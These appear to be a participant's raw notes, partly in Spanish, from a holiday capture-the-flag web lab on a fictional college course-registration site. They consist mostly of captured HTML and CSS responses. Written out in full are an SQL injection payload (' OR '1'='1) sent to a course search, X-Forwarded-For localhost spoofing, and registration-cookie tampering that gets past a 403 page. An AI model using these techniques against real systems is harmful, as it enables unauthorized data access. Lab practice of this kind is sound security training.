    .cookie {
        width: 60px;
        height: 60px;
        border-radius: 50%;
        position: relative;
    }
    
    .cookie::before {
        position: absolute;
        width: 6px;
        height: 6px;
        background: #3d2817;
        border-radius: 50%;
        top: 15px;
        left: 20px;
        box-shadow: 
            15px 10px 0 #3d2817,
            -10px 15px 0 #3d2817,
            20px -5px 0 #3d2817,
            -5px -10px 0 #3d2817;
    }
    
    .cookie-frosted {
        width: 60px;
        height: 60px;
        background: #c87f35;
        border-radius: 50%;
        position: relative;
        box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.3);
    }
    
    .cookie-frosted::before {
        content: '';
        position: absolute;
        width: 50px;
        height: 50px;
        background: #f5f5f5;
        border-radius: 50%;
        top: 5px;
        left: 5px;
    }
    
    .cookie-sprinkles {
        width: 60px;
        height: 60px;
        background: #c87f35;
        border-radius: 50%;
        position: relative;
        box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.3);
    }
    
    .cookie-sprinkles::before {
        content: '';
        position: absolute;
        width: 50px;
        height: 50px;
        background: #f5f5f5;
        border-radius: 50%;
        top: 5px;
        left: 5px;
    }
    
    .sprinkle {
        position: absolute;
        width: 5px;
        height: 2px;
        border-radius: 1px;
        z-index: 2;
        top: 50%;
        left: 50%;
    }
    
    .cookie-display-container {
        position: relative;
        width: 100%;
        margin: 1.5rem 0;
    }
    
    .cookie-display {
        display: flex;
        flex-direction: row;
        flex-wrap: nowrap;
        overflow-x: hidden;
        overflow-y: hidden;
        justify-content: flex-start;
        align-items: center;
        gap: 20px;
        padding: 20px 30px;
        background: rgba(255, 255, 255, 0.5);
        border-radius: 8px;
        white-space: nowrap;
        min-height: 100px;
        scroll-behavior: smooth;
        -webkit-overflow-scrolling: touch;
    }
    
    .cookie {
        display: inline-block;
        font-size: 3rem;
        animation: bounce 2s infinite ease-in-out;
        cursor: pointer;
        transition: transform 0.3s ease;
        flex-shrink: 0;
    }
    
    .cookie:hover {
        transform: scale(1.2);
    }
    
    .cookie:nth-child(2n) {
        animation-delay: 0.3s;
    }
    
    .cookie:nth-child(3n) {
        animation-delay: 0.6s;
    }
    
    .cookie:nth-child(4n) {
        animation-delay: 0.9s;
    }
    
    @keyframes bounce {
        0%, 100% {
            transform: translateY(0);
        }
        50% {
            transform: translateY(-10px);
        }
    }
    
    .cookie-scroll-btn {
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        width: 30px;
        height: 30px;
        background-color: rgba(210, 39, 54, 0.8);
        color: white;
        border: none;
        border-radius: 50%;
        font-size: 1rem;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        z-index: 10;
        opacity: 0.8;
        transition: all 0.2s ease;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
    }
    
    .cookie-scroll-btn:hover {
        opacity: 1;
        transform: translateY(-50%) scale(1.1);
        box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
    }
    
    .cookie-scroll-btn:focus {
        outline: none;
        box-shadow: 0 0 0 3px rgba(210, 39, 54, 0.4);
    }
    
    .cookie-scroll-btn.left {
        left: 10px;
    }
    
    .cookie-scroll-btn.right {
        right: 10px;
    }
    
    .cookie-scroll-btn.hidden {
        display: none;
    }
    
    @media (max-width: 768px) {
        .cookie {
            font-size: 2.5rem;
        }
        
        .cookie-display {
            gap: 15px;
            padding: 15px 25px;
        }
        
        .cookie-scroll-btn {
            width: 25px;
            height: 25px;
            font-size: 0.9rem;
        }
    }
    
    @media (max-width: 480px) {
        .cookie {
            font-size: 2rem;
        }
        
        .cookie-display {
            gap: 10px;
            padding: 10px 20px;
        }
        
        .cookie-scroll-btn {
            width: 22px;
            height: 22px;
            font-size: 0.8rem;
        }
    }
    
    @media (max-width: 768px) {
        .cookie-display {
            padding: 15px 0;
            gap: 15px;
        }
        
        .cookie {
            font-size: 2.5rem;
        }
    }
    
    @media (max-width: 480px) {
        .cookie-display {
            padding: 10px 0;
            gap: 10px;
        }
        
        .cookie {
            font-size: 2rem;
        }
    }
    
    .scroll-indicator {
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        color: var(--accent-color);
        font-size: 1.5rem;
        font-weight: bold;
        opacity: 0.7;
        cursor: pointer;
        z-index: 5;
        padding: 5px;
        background: rgba(255, 255, 255, 0.5);
        border-radius: 50%;
        width: 30px;
        height: 30px;
        display: flex;
        align-items: center;
        justify-content: center;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        transition: opacity 0.3s ease;
    }
    
    .scroll-indicator:hover {
        opacity: 1;
    }
    
    .scroll-indicator.left {
        left: 5px;
    }
    
    .scroll-indicator.right {
        right: 5px;
    }
    
    @media (max-width: 480px) {
        h2.semester-heading,
        .courses-container > h2 {
            font-size: 1.2rem;
        }
    }
    
    .reindeer-gallery {
        margin: 1.5rem 0;
        overflow: auto;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    .reindeer-profile {
        background: rgba(255, 255, 255, 0.9);
        padding: 0.8rem;
        border-radius: 8px;
        width: calc(33.33% - 10px);
        box-sizing: border-box;
        text-align: center;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    .reindeer-profile h3 {
        margin-top: 0;
        margin-bottom: 0.5rem;
        font-size: 1.2rem;
        color: var(--accent-color);
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }
    
    .reindeer-profile p {
        margin: 0.3rem 0;
        font-size: 0.9rem;
        overflow: hidden;
        text-overflow: ellipsis;
    }

    .reindeer-table {
        width: 100%;
        border-collapse: collapse;
        background: rgba(255, 255, 255, 0.9);
        border-radius: 8px;
        overflow: hidden;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    .reindeer-table th {
        background-color: var(--accent-color);
        color: white;
        padding: 12px 15px;
        text-align: center;
        font-weight: bold;
        font-size: 1rem;
    }
    
    .reindeer-table td {
        padding: 10px 15px;
        border-bottom: 1px solid rgba(0, 0, 0, 0.1);
        font-size: 0.95rem;
    }
    
    .reindeer-table tr:last-child td {
        border-bottom: none;
    }
    
    .reindeer-table tr:nth-child(even) {
        background-color: rgba(235, 235, 235, 0.5);
    }
    
    .reindeer-table .reindeer-name {
        font-weight: bold;
        color: var(--accent-color);
    }
    
    @media (max-width: 768px) {
        .reindeer-table th,
        .reindeer-table td {
            padding: 8px 10px;
            font-size: 0.9rem;
        }
    }
    
    @media (max-width: 480px) {
        .reindeer-table {
            font-size: 0.85rem;
        }
        
        .reindeer-table th,
        .reindeer-table td {
            padding: 6px 8px;
            font-size: 0.8rem;
        }
    }

    @media (max-width: 768px) {
        .reindeer-profile {
            width: calc(50% - 10px);
        }
        
        .reindeer-profile h3 {
            font-size: 1.1rem;
        }
    }
    
    @media (max-width: 480px) {
        .reindeer-profile {
            width: 100%;
        }
        
        .reindeer-profile h3 {
            font-size: 1rem;
        }
        
        .reindeer-gallery {
            gap: 10px;
        }
    }
    
    .reindeer-gallery {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        gap: 1rem;
        margin-top: 1.5rem;
        background: rgba(255, 255, 255, 0.8);
        padding: 1rem;
        border-radius: 8px;
    }
    
    .reindeer-profile {
        text-align: center;
        width: 100px;
        padding: 0.5rem;
        background: rgba(255, 255, 255, 0.9);
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    .reindeer-avatar {
        font-size: 2rem;
        margin-bottom: 0.5rem;
    }
    
    .reindeer-name {
        font-weight: bold;
        margin-bottom: 0.3rem;
    }
    
    .reindeer-specialty {
        font-size: 0.8rem;
        color: #666;
    }
    
    .blueprint {
        background: rgba(255, 255, 255, 0.9);
        padding: 1rem;
        border-radius: 8px;
        margin: 1.5rem auto;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        text-align: center;
    }
    
    .blueprint h3 {
        font-size: 1.2rem;
        color: var(--accent-color);
        margin-top: 0;
        margin-bottom: 0.8rem;
        text-align: center;
    }
    
    .ascii-art {
        display: flex;
        justify-content: center;
        align-items: center;
    }
    
    .ascii-art pre {
        display: inline-block;
        margin: 0;
        text-align: left;
        font-family: monospace;
        font-size: 0.75rem;
        line-height: 1.2;
        white-space: pre;
        color: var(--accent-color);
    }
    
    @media (max-width: 768px) {
        .blueprint h3 {
            font-size: 1.1rem;
        }
        
        .ascii-art pre {
            font-size: 0.65rem;
        }
    }
    
    @media (max-width: 600px) {
        .ascii-art pre {
            font-size: 0.55rem;
            line-height: 1;
        }
    }
    
    @media (max-width: 480px) {
        .blueprint {
            padding: 0.8rem;
        }
        
        .blueprint h3 {
            font-size: 1rem;
            margin-bottom: 0.6rem;
        }
        
        .ascii-art pre {
            font-size: 0.45rem;
            line-height: 0.9;
        }
    }
    
    @media (max-width: 320px) {
        .ascii-art pre {
            font-size: 0.4rem;
            transform: scale(0.8);
            transform-origin: center center;
        }
    }
</style>
</head>
<body>
    <div class="mini-gnome-container"></div>
<script>
(function() {
    if (window.gnomeVandalLoaded) return;
    window.gnomeVandalLoaded = true;
    
    document.addEventListener('DOMContentLoaded', function() {
        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) return parts.pop().split(";").shift();
        }

        if (getCookie('Schrodinger')) {
            var container = document.querySelector('.mini-gnome-container');
            if (container && !document.getElementById('mini-gnome')) {
                var img = document.createElement('img');
                img.src = '/gnomeU?id=d116a229-4021-45ff-a1bb-c6024a9e5850';
                img.id = 'mini-gnome';
                img.style.cssText = 'width: 20px;height: auto;position: fixed; left: 10px; bottom: 10px;';
                container.appendChild(img);
            }
        }
    });
})();
</script>
    <main id="elfStyle" style="padding: 1.5rem; width: 100%;">
        <!-- Include common animations -->
        <div id="snowflakes"></div>

<script src="/register/js/course_common.js"></script>
        
        <header>
            <p class="welcome" role="banner">🎄 Neighborhood College Course Details</p>
        </header>
        
        <section class="courses-content">
            <div class="courses-container">
                <div class="course-banner">
                    <div class="course-icon">🧸</div>
                    <h1 style="font-size: 1.5rem;">HOL 101 - Holiday Toy Making Fundamentals</h1>
                    <p style="font-size: .85rem;">4 Credits | Prerequisite: None</p>
                </div>
                
                <div class="instructor-section">
                    <div class="instructor-avatar">JJ</div>
                    <div>
                        <h3>Instructor: Jingle Jangles</h3>
                        <p>Master Toymaker, 150 years experience</p>
                    </div>
                </div>
                
                <div class="course-details">
                    <div class="course-section">
                        <h2>❄️ Course Description</h2>
                        <p>An introductory course covering the basic principles of holiday toy making. Students will learn traditional techniques using various materials like wood, fabric, and recycled items. Perfect for first-year builders looking to build a foundation in toy workshop operations.</p>
                    </div>
                    
                    <div class="course-section">
                        <h2>❄️ Learning Outcomes</h2>
                        <ul>
                            <li>Master the safe use of toy-making tools</li>
                            <li>Understand toy design blueprints</li>
                            <li>Create three working prototype toys</li>
                            <li>Learn to work efficiently under holiday deadlines</li>
                        </ul>
                    </div>
                </div>
                
                <div class="course-section">
                    <h2>❄️ Weekly Schedule</h2>
                    <ul style="text-align: center; list-style-position: inside; margin-bottom: 0;">
                        <li><strong>Week 1-2:</strong> Safety, Tools, and Workshop Etiquette</li>
                        <li><strong>Week 3-4:</strong> Wood Carving and Assembly</li>
                        <li><strong>Week 5-6:</strong> Fabric Toy Construction</li>
                        <li><strong>Week 7-8:</strong> Paint and Decoration Techniques</li>
                        <li><strong>Week 9-10:</strong> Basic Mechanical Toys</li>
                        <li><strong>Week 11-12:</strong> Quality Control and Toy Standards</li>
                    </ul>
                </div>
            </div>
        </section>
        
        <a href="/register/courses/search" class="back-to-search">Search</a>
        
        <!-- Common navigation and instructions section -->
<p class="violation"><a href="/">🏠 Return Home</a> | <a href="/register/reset">🔁 Reset Session</a> | <a href="/register/status_report">📋 View Status Report</a> | <a href="#" id="instBtn" aria-expanded="false" aria-controls="rules">📖 Instructions</a></p>
<div id="rules" class="rules" aria-hidden="true">    <img id="instructions" src="/register/images/instructions.png" alt="Instructions for the Registration System" style="max-height:100%;">
    <button id="closeInstructions" class="close-instructions" aria-label="Close Instructions">Close</button>
</div>
    </main>
</body>
</html>
```

### sqli
```
' OR '1'='1


POST /register/courses/search?id=d116a229-4021-45ff-a1bb-c6024a9e5850 HTTP/2
Host: flask-schrodingers-scope-firestore.holidayhackchallenge.com
Cookie: Schrodinger=a409ddd1-7278-45f2-9a57-df6960515d33; registration=eb72a05369dcb453
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Origin: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com
Referer: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/search?id=d116a229-4021-45ff-a1bb-c6024a9e5850
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-For: 127.0.0.1

courseNumber=%27+OR+%271%27%3D%271&id=d116a229-4021-45ff-a1bb-c6024a9e5850


HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: registration=eb72a05369dcb44e; Path=/
X-Cloud-Trace-Context: 1ea1bbe2fe14d3eebf006e7b469aa378;o=1
Date: Thu, 04 Dec 2025 05:20:39 GMT
Server: Google Frontend
Content-Length: 7316
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Common head elements -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="/register/css/style.css">
<link rel="icon" href="/register/images/favicon.ico" type="image/x-icon">
<script src="/register/js/home.js" defer></script>
<script src="/register/js/idparam-propagation.js" defer></script>
<style>
    body {
        background: url('/register/images/snowy_background.png') no-repeat center center fixed;
        background-size: cover;
    }
    
    :root {
        --accent-color: #D22736;
        --accent-color-rgb: 210, 39, 54;
        --secondary-color: #4d9e40;
    }
</style>
    <title>Search</title>
    <!-- Common page styles -->
<style>    
    .snowflake {
        position: absolute;
        color: white;
        opacity: 0.7;
        font-size: 1.5rem;
        animation: fall linear infinite;
        z-index: -1;
    }
    
    @keyframes fall {
        0% {
            transform: translateY(-100vh);
        }
        100% {
            transform: translateY(95vh);
        }
    }
      /* Snowflake styles */
    #snowflakes {
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        pointer-events: none;
        z-index: -1;
        overflow: hidden;
    }
	
	/* Snow particles animation */
    .snow-animation {
        position: relative;
        height: 150px;
        background: linear-gradient(to bottom, #3498db, #2c3e50);
        border-radius: 8px;
        margin-top: 1.5rem;
        overflow: hidden;
    }
    
    .snow-particle {
        position: absolute;
        background: white;
        border-radius: 50%;
        opacity: 0.8;
        animation: snowfall linear infinite;
    }
    
    @keyframes snowfall {
        0% {
            transform: translateY(-10px);
        }
        100% {
            transform: translateY(150px);
        }
    }
</style>
    <link rel="stylesheet" href="/register/css/commonO.css">
    <link rel="stylesheet" href="/register/css/gnome-character.css">
    <link rel="stylesheet" href="/register/css/course-search-form.css">
    <link rel="stylesheet" href="/register/css/search-results.css">
    <link rel="stylesheet" href="/register/css/notification.css">
</head>
<body>
    <div class="mini-gnome-container"></div>
<script>
(function() {
    if (window.gnomeVandalLoaded) return;
    window.gnomeVandalLoaded = true;
    
    document.addEventListener('DOMContentLoaded', function() {
        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) return parts.pop().split(";").shift();
        }

        if (getCookie('Schrodinger')) {
            var container = document.querySelector('.mini-gnome-container');
            if (container && !document.getElementById('mini-gnome')) {
                var img = document.createElement('img');
                img.src = '/gnomeU?id=d116a229-4021-45ff-a1bb-c6024a9e5850';
                img.id = 'mini-gnome';
                img.style.cssText = 'width: 20px;height: auto;position: fixed; left: 10px; bottom: 10px;';
                container.appendChild(img);
            }
        }
    });
})();
</script>
    
    <div class="notification">In-scope vulnerability previously found and reported.</div>
    
    <main id="elfStyle" style="top: 10vh;">
        <!-- Include common animations -->
        <div id="snowflakes"></div>
        
        <header>
            <p class="welcome oTitle" role="banner">🎄 Neighborhood College Course Search</p>
        </header>
        <section class="oContent">
            <div class="oContainer">
                <form method="POST" class="course-search-form">
                    <div class="form-group inline-form-group">                
                        <label for="courseNumber">Enter course number:</label>
                        <input type="text" id="courseNumber" name="courseNumber" placeholder="(000-999)" style="width: 90px !important;" value="&#39; OR &#39;1&#39;=&#39;1">
                    </div>
                    <div class="button-container">                
                        <input type="submit" value="Lookup">
                    </div>
                </form>
                
                
                <div class="search-results">
                    <h3>Search Results:</h3>
                    <ul class="courses-list" style="font-size: 1rem; text-align: left;">
                        
                        <li>
                            <a href="/register/courses/toy_making">HOL 101 - Holiday Toy Making Fundamentals</a>
                        </li>
                        
                        <li>
                            <a href="/register/courses/snow_dynamics">HOL 202 - Advanced Snow Dynamics</a>
                        </li>
                        
                        <li>
                            <a href="/register/courses/cookie_baking">HOL 224 - Holiday Cookie Baking and Frosting Techniques</a>
                        </li>
                        
                        <li>
                            <a href="/register/courses/sleigh_mechanics">HOL 315 - Modern Sleigh Mechanics</a>
                        </li>
                        
                        <li>
                            <a href="/register/courses/gift_wrapping">HOL 327 - Speed Gift Wrapping</a>
                        </li>
                        
                        <li>
                            <a href="/register/courses/reindeer_care">HOL 405 - Reindeer Care and Guidance</a>
                        </li>
                        
                        <li>
                            <a href="/register/courses/gnome_mischief">GNOME 827 - Mischief Management</a>
                        </li>
                        
                    </ul>
                </div>
                
                
                <p class="warning-message">Not all courses are available for the upcoming term. Please only register for Spring 2026 courses.</p>
            </div>
        </section>
        <!-- Common navigation and instructions section -->
<p class="violation"><a href="/">🏠 Return Home</a> | <a href="/register/reset">🔁 Reset Session</a> | <a href="/register/status_report">📋 View Status Report</a> | <a href="#" id="instBtn" aria-expanded="false" aria-controls="rules">📖 Instructions</a></p>
<div id="rules" class="rules" aria-hidden="true">    <img id="instructions" src="/register/images/instructions.png" alt="Instructions for the Registration System" style="max-height:100%;">
    <button id="closeInstructions" class="close-instructions" aria-label="Close Instructions">Close</button>
</div>
        <div class="gnome-character-container">
            <img src="/register/images/gnome-hacker.png" alt="Gnome Hacker" class="gnome-image">
            <div class="speech-bubble">
                <span class="initial-text">Well, well, well! Aren't you clever! But ...</span>
                <span class="hover-text">... if you want really clever, check those results!.</span>
            </div>
        </div>
    </main>
</body>
</html>
```

### encontradas hasta aqui

```
### 🔍 Vulnerabilities Found

- ✅ **Uncovered developer information disclosure.**
- ✅ **Exploited Information Disclosure via login**
- ✅ **Found commented-out course search**
- ✅ **Identified SQL injection vulnerability**

Total Found: **4**
```


## algo mas

```
GET /register/courses/wip/holiday_behavior?id=d116a229-4021-45ff-a1bb-c6024a9e5850 HTTP/2
Host: flask-schrodingers-scope-firestore.holidayhackchallenge.com
Cookie: Schrodinger=a409ddd1-7278-45f2-9a57-df6960515d33; registration=eb72a05369dcb44d
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-For: 127.0.0.1


HTTP/2 403 Forbidden
Content-Type: text/html; charset=utf-8
X-Cloud-Trace-Context: 45ebdcb8d5a369b0976a3f425acff47d;o=1
Date: Thu, 04 Dec 2025 05:32:50 GMT
Server: Google Frontend
Content-Length: 4234
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Common head elements -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="/register/css/style.css">
<link rel="icon" href="/register/images/favicon.ico" type="image/x-icon">
<script src="/register/js/home.js" defer></script>
<script src="/register/js/idparam-propagation.js" defer></script>
<style>
    body {
        background: url('/register/images/snowy_background.png') no-repeat center center fixed;
        background-size: cover;
    }
    
    :root {
        --accent-color: #D22736;
        --accent-color-rgb: 210, 39, 54;
        --secondary-color: #4d9e40;
    }
</style>
    <title>403 Forbidden</title>
    <!-- Common page styles -->
<style>    
    .snowflake {
        position: absolute;
        color: white;
        opacity: 0.7;
        font-size: 1.5rem;
        animation: fall linear infinite;
        z-index: -1;
    }
    
    @keyframes fall {
        0% {
            transform: translateY(-100vh);
        }
        100% {
            transform: translateY(95vh);
        }
    }
      /* Snowflake styles */
    #snowflakes {
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        pointer-events: none;
        z-index: -1;
        overflow: hidden;
    }
	
	/* Snow particles animation */
    .snow-animation {
        position: relative;
        height: 150px;
        background: linear-gradient(to bottom, #3498db, #2c3e50);
        border-radius: 8px;
        margin-top: 1.5rem;
        overflow: hidden;
    }
    
    .snow-particle {
        position: absolute;
        background: white;
        border-radius: 50%;
        opacity: 0.8;
        animation: snowfall linear infinite;
    }
    
    @keyframes snowfall {
        0% {
            transform: translateY(-10px);
        }
        100% {
            transform: translateY(150px);
        }
    }
</style>
</head>
<body>
    <div class="mini-gnome-container"></div>
<script>
(function() {
    if (window.gnomeVandalLoaded) return;
    window.gnomeVandalLoaded = true;
    
    document.addEventListener('DOMContentLoaded', function() {
        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) return parts.pop().split(";").shift();
        }

        if (getCookie('Schrodinger')) {
            var container = document.querySelector('.mini-gnome-container');
            if (container && !document.getElementById('mini-gnome')) {
                var img = document.createElement('img');
                img.src = '/gnomeU?id=d116a229-4021-45ff-a1bb-c6024a9e5850';
                img.id = 'mini-gnome';
                img.style.cssText = 'width: 20px;height: auto;position: fixed; left: 10px; bottom: 10px;';
                container.appendChild(img);
            }
        }
    });
})();
</script>
    <main id="elfStyle">
        <!-- Include common animations -->
        <div id="snowflakes"></div>
        
        <header>
            <p class="welcome error-title" role="banner">⛔ 403 Forbidden</p>
        </header>
        <section class="error-content">
            <div class="forbidden-container" style="font-size: clamp(1rem, 4vw, 1.3rem);">
                <p>You don't have permission to access this area.</p>
                
                <p><strong>Invalid session registration value</strong></p>
                
            </div>
        </section>
        <!-- Common navigation and instructions section -->
<p class="violation"><a href="/">🏠 Return Home</a> | <a href="/register/reset">🔁 Reset Session</a> | <a href="/register/status_report">📋 View Status Report</a> | <a href="#" id="instBtn" aria-expanded="false" aria-controls="rules">📖 Instructions</a></p>
<div id="rules" class="rules" aria-hidden="true">    <img id="instructions" src="/register/images/instructions.png" alt="Instructions for the Registration System" style="max-height:100%;">
    <button id="closeInstructions" class="close-instructions" aria-label="Close Instructions">Close</button>
</div>
    </main>
</body>
</html>
```



```
GET /register/courses/wip/holiday_behavior?id=d116a229-4021-45ff-a1bb-c6024a9e5850 HTTP/2
Host: flask-schrodingers-scope-firestore.holidayhackchallenge.com
Cookie: Schrodinger=a409ddd1-7278-45f2-9a57-df6960515d33; registration=eb72a05369dcb44c
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-For: 127.0.0.1
Connection: keep-alive



HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: registration=eb72a05369dcb451; Path=/
X-Cloud-Trace-Context: b64bf37285b99d950eb2d6968758eaf6
Date: Thu, 04 Dec 2025 05:47:57 GMT
Server: Google Frontend
Content-Length: 24147
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Common head elements -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="/register/css/style.css">
<link rel="icon" href="/register/images/favicon.ico" type="image/x-icon">
<script src="/register/js/home.js" defer></script>
<script src="/register/js/idparam-propagation.js" defer></script>
<style>
    body {
        background: url('/register/images/snowy_background.png') no-repeat center center fixed;
        background-size: cover;
    }
    
    :root {
        --accent-color: #D22736;
        --accent-color-rgb: 210, 39, 54;
        --secondary-color: #4d9e40;
    }
</style>
    <title>Holiday Behavior Studies</title>
    <!-- Common page styles -->
<style>    
    .snowflake {
        position: absolute;
        color: white;
        opacity: 0.7;
        font-size: 1.5rem;
        animation: fall linear infinite;
        z-index: -1;
    }
    
    @keyframes fall {
        0% {
            transform: translateY(-100vh);
        }
        100% {
            transform: translateY(95vh);
        }
    }
      /* Snowflake styles */
    #snowflakes {
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        pointer-events: none;
        z-index: -1;
        overflow: hidden;
    }
	
	/* Snow particles animation */
    .snow-animation {
        position: relative;
        height: 150px;
        background: linear-gradient(to bottom, #3498db, #2c3e50);
        border-radius: 8px;
        margin-top: 1.5rem;
        overflow: hidden;
    }
    
    .snow-particle {
        position: absolute;
        background: white;
        border-radius: 50%;
        opacity: 0.8;
        animation: snowfall linear infinite;
    }
    
    @keyframes snowfall {
        0% {
            transform: translateY(-10px);
        }
        100% {
            transform: translateY(150px);
        }
    }
</style>
    <!-- Common course page styles -->
<style>
    .course-banner {
        background: linear-gradient(to right, #e74c3c, #c0392b);
        border-radius: 8px;
        color: white;
        text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
    }
    
    .course-icon {
        font-size: 2.5rem;
    }
    
    .course-details {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 1.5rem;
        margin-bottom: 1rem;
    }
    
    .course-section {
        background: rgba(255, 255, 255, 0.9);
        padding: .5rem;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    .courses-content {
        width: 100%;
        display: flex;
        justify-content: center;
    }

    .courses-container {
        position: relative;
        background: rgba(255, 255, 255, 0.8);
        padding: 1rem;
        border-radius: 10px;
        width: 90%;
        max-width: 1100px;
        margin: 0 auto;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    .courses-list {
        text-align: left;
        background: transparent;
        padding: 0;
        font-size: clamp(0.9rem, 1.7vw, 1.3rem);
    }

    .courses-list li {
        padding: 0.5rem 0;
        border-bottom: 1px solid rgba(0, 0, 0, 0.1);
        white-space: normal;
        line-height: 1.3;
    }

    .courses-list a {
        display: inline-block;
    }
    
    .course-banner p {
        font-size: clamp(0.9rem, 2vw, 1.2rem);
        background: transparent;
    }

    .course-section h2 {
        font-size: clamp(1.2rem, 2.5vw, 1.8rem);
        margin-bottom: 0.8rem;
    }

    .course-section p, 
    .course-section li {
        font-size: clamp(0.9rem, 2vw, 1.2rem);
        line-height: 1.4;
        margin-bottom: 0.5rem;
        font-size: .9rem;
    }

    .instructor-section {
        display: flex;
        align-items: center;
        gap: 1.5rem;
        background: rgba(255, 255, 255, 0.9);
        border-radius: 8px;
        margin-bottom: 1rem;
        justify-content: center;
    }
    
    .instructor-section h3 {
        font-size: clamp(1.1rem, 2.2vw, 1.5rem);
    }

    .instructor-section p {
        font-size: clamp(0.8rem, 1.8vw, 1.1rem);
        background: transparent;
        margin: 0;
        padding: 0;
    }

    .instructor-avatar {
        background: #2ecc71;
        color: white;
        width: 50px;
        height: 50px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 1.5rem;
    }

    h2.semester-heading, 
    .courses-container > h2 {
        white-space: nowrap;
        font-size: 1.5rem;
        margin: 1rem 0;
        text-align: center;
    }
    
    ul {
        background: var(--panel-bg);
        padding: 1rem;
        border-radius: 10px;
        list-style-type: square;
        margin-bottom: 1rem;
        text-align: left;
    }

    .back-to-search {
        position: fixed;
        bottom: 15px;
        right: 15px;
        background-color: rgba(210, 39, 54, 0.85);
        color: white;
        padding: 5px 10px;
        border-radius: 15px;
        font-size: 0.75rem;
        text-decoration: none;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        z-index: 1000; 
        transition: all 0.3s ease;
        white-space: nowrap;
        max-width: 90px;
        overflow: hidden;
        text-overflow: ellipsis;
        opacity: 0.85;
        transform: translate(0, 0);
    }
    
    .back-to-search:hover {
        background-color: rgba(210, 39, 54, 1);
        opacity: 1;
        transform: translateY(-2px);
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
    }
    
    .back-to-search::before {
        content: "←";
        margin-right: 3px;
    }
    
    @media (max-width: 768px) {
        .back-to-search {
            bottom: 65px; 
            right: 10px;
            font-size: 0.7rem;
            padding: 4px 8px;
            max-width: 80px;
        }
    }
    
    @media (max-width: 600px) {
        .back-to-search {
            bottom: 70px;
            right: 10px;
            font-size: 0.7rem;
            padding: 3px 7px;
            max-width: 75px;
        }
    }
    
    @media (max-width: 480px) {
        .back-to-search {
            bottom: 80px;
            right: 8px;
            font-size: 0.65rem;
            padding: 3px 6px;
            max-width: 70px;
        }
    }
    
    @media (max-width: 768px) {
        .back-to-search {
            font-size: 0.8rem;
            padding: 5px 10px;
            bottom: 20px;
